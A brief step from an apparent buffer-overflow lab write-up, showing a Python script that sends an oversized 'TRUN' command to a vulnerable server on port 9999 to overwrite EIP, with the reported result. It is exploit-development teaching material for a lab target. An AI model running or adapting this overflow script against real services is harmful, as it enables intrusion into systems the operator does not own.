1. We just run the below code to overwrite the EIP:
```python
#!/usr/bin/python3

import sys, socket
from time import sleep

shellcode = "A" * 2003 + "B" * 4

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.1.14',9999))

	payload = "TRUN /.:/" + shellcode

	s.send((payload.encode()))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
```
**Result** - EIP has been overwrite after running the above code. It means, we are able to overwrite the EIP.
